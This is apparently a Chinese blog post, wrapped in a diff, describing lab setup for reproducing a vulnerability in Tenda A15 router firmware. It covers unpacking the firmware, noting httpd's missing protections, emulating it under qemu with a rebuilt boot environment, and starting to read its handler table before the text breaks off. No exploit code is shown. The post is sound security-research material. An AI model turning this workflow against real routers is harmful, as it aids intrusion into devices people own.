@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>IOT漏洞挖掘初体验-Tenda A15 | wlmt666的博客</title><meta name="author" content="胡楚昊"><meta name="copyright" content="胡楚昊"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="refer:[IOT漏洞挖掘初体验-Tenda A15 | Zach0ry’s blog](https:&#x2F;&#x2F;zach0ry-zzh.github.io&#x2F;2026&#x2F;04&#x2F;04&#x2F;Tenda A15 固件模拟与漏洞复现&#x2F;) [原创][分享][注意][分享]Tenda A15 固件模拟与漏洞复现-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛 前言最近在pwn大手子的带领下逐渐学习物联网安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT漏洞挖掘初体验-Tenda A15">
+<meta property="og:url" content="https://wlmt666.top/2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/index.html">
+<meta property="og:site_name" content="wlmt666的博客">
+<meta property="og:description" content="refer:[IOT漏洞挖掘初体验-Tenda A15 | Zach0ry’s blog](https:&#x2F;&#x2F;zach0ry-zzh.github.io&#x2F;2026&#x2F;04&#x2F;04&#x2F;Tenda A15 固件模拟与漏洞复现&#x2F;) [原创][分享][注意][分享]Tenda A15 固件模拟与漏洞复现-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛 前言最近在pwn大手子的带领下逐渐学习物联网安">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wlmt666.top/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-04-13T13:47:04.000Z">
+<meta property="article:modified_time" content="2026-04-15T12:48:24.827Z">
+<meta property="article:author" content="胡楚昊">
+<meta property="article:tag" content="iot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wlmt666.top/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "IOT漏洞挖掘初体验-Tenda A15",
+  "url": "https://wlmt666.top/2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/",
+  "image": "https://wlmt666.top/img/butterfly-icon.png",
+  "datePublished": "2026-04-13T13:47:04.000Z",
+  "dateModified": "2026-04-15T12:48:24.827Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "胡楚昊",
+      "url": "https://wlmt666.top/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="../../../../img/favicon.png"><link rel="canonical" href="https://wlmt666.top/2026/04/13/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="../../../../css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'IOT漏洞挖掘初体验-Tenda A15',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/wlmt666.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="../img/butterfly-icon.png" onerror="this.onerror=null;this.src='../img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="../archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="../tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="../categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="../categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="../about"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="../archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="../../../../index.html"><span class="site-name">wlmt666的博客</span></a><a class="nav-page-title" href="../../../../index.html"><span class="site-name">IOT漏洞挖掘初体验-Tenda A15</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="../categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="../about"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="../archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">IOT漏洞挖掘初体验-Tenda A15</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-13T13:47:04.000Z" title="发表于 2026-04-13 21:47:04">2026-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-15T12:48:24.827Z" title="更新于 2026-04-15 20:48:24">2026-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>refer:[IOT漏洞挖掘初体验-Tenda A15 | Zach0ry’s blog](<a target="_blank" rel="noopener" href="https://zach0ry-zzh.github.io/2026/04/04/Tenda">https://zach0ry-zzh.github.io/2026/04/04/Tenda</a> A15 固件模拟与漏洞复现&#x2F;)</p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-290714.htm">原创][分享][注意][分享]Tenda A15 固件模拟与漏洞复现-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在pwn大手子的带领下逐渐学习物联网安全，想着先复现一个典型漏洞看看。</p>
+<p>首先需要准备以下工作：<br><strong>1.安装binwalk</strong></p>
+<p>binwalk是一把利刃。kali内置了binwalk，如果直接<code>sudo apt install binwalk</code>可能会使用的时候报错，原因可能是因为python包环境冲突，解决办法是删除冲突的环境，这里以我的为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip uninstall -y binwalk</span><br><span class="line"><span class="built_in">rm</span> -rf ~/.local/lib/python3.12/site-packages/binwalk*</span><br><span class="line"><span class="built_in">sudo</span> apt install --reinstall python3-binwalk binwalk -y</span><br><span class="line"><span class="built_in">hash</span> -r</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.安装sasquatch</strong><br>直接克隆仓库即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/devttys0/sasquatch.git</span><br><span class="line">cd sasquatch</span><br></pre></td></tr></table></figure>
+
+<p>我当时报了这个错误：<br><img src="image-20260414213325738.png" alt="image-20260414213325738"></p>
+<p>这里参考了<a target="_blank" rel="noopener" href="https://xu17.top/2025/02/15/IOT%20%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E8%A7%A3%E5%8E%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95">https://xu17.top/2025/02/15/IOT%20%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E8%A7%A3%E5%8E%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/的解决办法</a></p>
+<p>如下：<br>（虽然还会继续报错但是不影响日常使用了）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在sasquatch  目录</span></span><br><span class="line"><span class="built_in">sudo</span> wget https://github.com/devttys0/sasquatch/pull/47.patch  </span><br><span class="line"><span class="built_in">sudo</span> patch -p1 &lt; 47.patch  </span><br><span class="line"><span class="built_in">sudo</span> ./build.sh</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>which sasquatch</code>正常回显就说明成功了</p>
+<p><strong>3.qemu</strong></p>
+<p>这里需要安装<code>qemu-mipsel-static </code>和<code>qemu-system-mipsel</code>这俩工具，用于在不同的系统架构上去模拟，用来执行目标程序</p>
+<p>安装方法可以问AI，这里不多说了</p>
+<h1 id="固件解包与环境模拟"><a href="#固件解包与环境模拟" class="headerlink" title="固件解包与环境模拟"></a>固件解包与环境模拟</h1><p>输入命令：<code>binwalk -Me IOT.bin</code>解包固件，出来一个文件系统</p>
+<p>固件下载地址：<a target="_blank" rel="noopener" href="https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip">https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip</a></p>
+<p>这里咱们需要关注bin目录下的httpd文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; file httpd</span><br><span class="line">httpd: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, with debug_info, not stripped</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过file命令，足以看出这是32位可执行文件，我们还可用<code>checksec</code>辅助判断一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; pwn checksec httpd</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Downloads/_US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin.extracted/squashfs-root/bin/httpd&#x27;</span></span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>说实话明显看出可能存在栈漏洞，具体的还需要进入程序分析</p>
+<p><img src="image-20260415174627965.png" alt="image-20260415174627965"></p>
+<p>看到这是main函数，接下来用qemu模拟</p>
+<p>需要注意，我们由于提取出了完整的文件系统，这里一般要把根目录设置成文件系统的路径，在这里至少先模拟出程序的运行环境</p>
+<p>将 x86 架构下的 MIPS 翻译器（QEMU）复制到当前假根目录中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
+
+<p>然后运行：<code>&gt; sudo chroot . ./qemu-mipsel-static ./bin/httpd</code></p>
+<p>不出意外的话会报错：<br><img src="image-20260415201702933.png" alt="image-20260415201702933"></p>
+<p>这里是因为我们qemu直接模拟执行，缺乏“开机”这个步骤，这个步骤会生成一些必须文件等关键操作，可以参考本文引用的两篇文章的描述：</p>
+<blockquote>
+<p>在真实的 IoT 设备中，根文件系统（也就是提取出来的 <code>squashfs</code>）通常是<strong>只读的（Read-Only）</strong>。</p>
+<p>但是，<code>httpd</code> 服务在运行时，必须生成一些动态数据，比如：</p>
+<ul>
+<li>记录当前进程号的 PID 文件</li>
+<li>用户的 Session 缓存、临时上传的配置文件。</li>
+<li>运行时的网络状态（<code>/var/run</code>）。</li>
+</ul>
+<p><strong>真实路由器的做法</strong>：在系统刚通电开机时，操作系统的启动脚本（<code>init</code>）会在内存中划分出一块区域（<code>tmpfs</code>，也就是内存虚拟盘），然后把 <code>/var</code>、<code>/tmp</code> 等需要频繁读写的目录挂载到这个内存盘上。接着，它会把出厂默认的配置文件（存放在以 <code>_ro</code> 即 Read-Only 结尾的目录里）复制到真正的运行目录中。</p>
+<p><strong>我们的模拟环境</strong>：提取出的 <code>squashfs-root</code> 只是固件在关机状态下的静态文件。它缺少了开机时动态创建的那些目录，而且真正的配置文件还在 <code>etc_ro</code> 里睡大觉，真正的网页文件还在 <code>webroot_ro</code> 里。</p>
+<p>在目录etc_ro中有init.d目录，其中的文件就是启动项,但是不能直接去启动它，因为它包含 <code>mount -t ramfs</code> 等命令会因为权限问题报错并且<code>/sbin</code>、<code>/etc</code> 等绝对路径与实际不符合</p>
+</blockquote>
+<p>解决办法是补环境</p>
+<p>查看etc_ro内的文件：这就是开机初始化脚本rCs</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin/</span><br><span class="line">export PATH</span><br><span class="line"></span><br><span class="line">mount -t ramfs none /var/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p /var/etc</span><br><span class="line">mkdir -p /var/media</span><br><span class="line">mkdir -p /var/webroot</span><br><span class="line">mkdir -p /var/etc/iproute</span><br><span class="line">mkdir -p /var/run</span><br><span class="line">mkdir -p /etc/udhcpc</span><br><span class="line">mkdir -p /var/debug</span><br><span class="line"></span><br><span class="line">cp -rf /etc_ro/* /etc/</span><br><span class="line">cp -rf /webroot_ro/* /webroot/</span><br><span class="line">umount -f /tmp</span><br><span class="line">mount -t tmpfs none /tmp -o size=3M</span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line">mount -t ramfs /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mdev -s</span><br><span class="line">mkdir /var/run</span><br><span class="line"></span><br><span class="line">echo &#x27;/sbin/mdev&#x27; &gt; /proc/sys/kernel/hotplug</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV&#x27;</span> &gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV&#x27;</span> &gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh&#x27;</span>&gt;&gt; /etc/mdev.conf</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wds rule start</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE&#x27;</span> &gt; /etc/mdev.conf</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wsd rule end</span></span><br><span class="line">echo &#x27;sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#x27; &gt;&gt; /etc/mdev.conf</span><br><span class="line">echo &#x27;-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH&#x27;&gt;&gt; /etc/mdev.conf</span><br><span class="line">echo &#x27;sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH&#x27;&gt;&gt; /etc/mdev.conf</span><br><span class="line">echo &#x27;.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE&#x27;&gt;&gt; /etc/mdev.conf</span><br><span class="line">mkdir -p /var/ppp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/fastnat.ko</span> </span><br><span class="line">insmod /lib/modules/bm.ko</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/ai.ko</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/mac_filter.ko</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/ip_mac_bind.ko</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/privilege_ip.ko</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/qos.ko</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/url_filter.ko</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">insmod /lib/modules/loadbalance.ko</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/app_filter.ko</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/port_filter.ko</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/arp_fence.ko</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/ddos_ip_fence.ko</span></span><br><span class="line">echo &quot;enable 0 interval 0&quot; &gt;/proc/watchdog_cmd</span><br><span class="line">chmod +x /etc/mdev.conf</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line">BUG[41877]:DUT播放组播视频，概率性出现有线PC无法进入管理界面</span><br><span class="line">解决SWITCH WAN口学到IP地址和BR0相同的arp表的问题</span><br><span class="line">*/</span><br><span class="line">echo 2 &gt; /proc/sys/net/ipv4/conf/eth1/arp_ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看大佬的博客，解决办法如下：</p>
+<p>1。先按照启动脚本的思路，补充一些文件&#x2F;文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ./var/etc</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/media</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/webroot</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/etc/iproute</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/run</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/etc/udhcpc</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/debug</span><br><span class="line"><span class="built_in">mkdir</span> -p ./dev/pts</span><br><span class="line"><span class="built_in">mkdir</span> -p ./var/ppp</span><br><span class="line"><span class="built_in">mkdir</span> -p ./tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -rf ./etc_ro/* ./var/etc/</span><br><span class="line"><span class="built_in">cp</span> -rf ./webroot_ro/* ./var/webroot</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2。挂载（Mount）：给程序装上“传感器，<code>proc</code>、<code>sys</code>、<code>dev</code> ，路由器程序（<code>httpd</code>）运行的时候，会去 <code>/proc</code> 里看系统状态。如果不挂载，它看到的文件夹就是空的，它会觉得自己跑在一个“死掉”的系统里，然后直接报错退出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mount -t proc /proc ./proc</span><br><span class="line"><span class="built_in">sudo</span> mount -t sysfs /sys ./sys</span><br><span class="line"><span class="built_in">sudo</span> mount --<span class="built_in">bind</span> /dev ./dev</span><br></pre></td></tr></table></figure>
+
+<p>3.软链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -snf ./var/webroot ./webroot</span><br></pre></td></tr></table></figure>
+
+<p>4.网卡接口配置</p>
+<p>为了“伪造”出路由器程序赖以生存的硬件环境，并打通与该程序之间的通信链路，让固件正常运行，我们必须在 Linux 内核中伪造出它所需的网络拓扑</p>
+<p><img src="image-20260415202818886.png" alt="image-20260415202818886"></p>
+<p>可以看到是br0和80端口</p>
+<p>运行下列命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> brctl addbr br0</span><br><span class="line"><span class="built_in">sudo</span> ip addr add 192.168.0.1/24 dev br0</span><br><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br></pre></td></tr></table></figure>
+
+<p>继续运行：<code>sudo chroot . ./qemu-mipsel-static ./bin/httpd</code></p>
+<p>可以在相应的IP访问到网站，说明绑定成功：<br><img src="image-20260415203113688.png" alt="image-20260415203113688"></p>
+<p>看<a target="_blank" rel="noopener" href="https://thir0th.github.io/2025/07/19/2025-07-19-Tenda_AC15%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda_AC15漏洞复现 | Thir0th’s Blog</a>师傅博客，可以patch下httpd以便捷搭建复现环境，但是我没有尝试</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先进入initwebs函数分析（main函数调用，通过函数名推测是一个初始化函数）</p>
+<p><img src="image-20260415204102611.png" alt="image-20260415204102611"></p>
+<p>这里面还有一张这就是腾达（Tenda）路由器网页后台的「功能菜单总表」</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">formDefineTendDa</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  websAspDefine(<span class="string">&quot;aspGetCharset&quot;</span>, aspGetCharset);</span><br><span class="line">  websFormDefine(<span class="string">&quot;getOnlineList&quot;</span>, formGetOnlineList);</span><br><span class="line">  websAspDefine(<span class="string">&quot;asp_error_message&quot;</span>, asp_error_message);</span><br><span class="line">  websAspDefine(<span class="string">&quot;asp_error_redirect_url&quot;</span>, asp_error_redirect_url);</span><br><span class="line">  websFormDefine(<span class="string">&quot;SetOnlineDevName&quot;</span>, formSetDeviceName);</span><br><span class="line">  websFormDefine(<span class="string">&quot;setBlackRule&quot;</span>, formAddMacfilterRule);</span><br><span class="line">  websFormDefine(<span class="string">&quot;delBlackRule&quot;</span>, formDelMacfilterRule);</span><br><span class="line">  websFormDefine(<span class="string">&quot;getBlackRuleList&quot;</span>, formGetMacfilterRuleList);</span><br><span class="line">  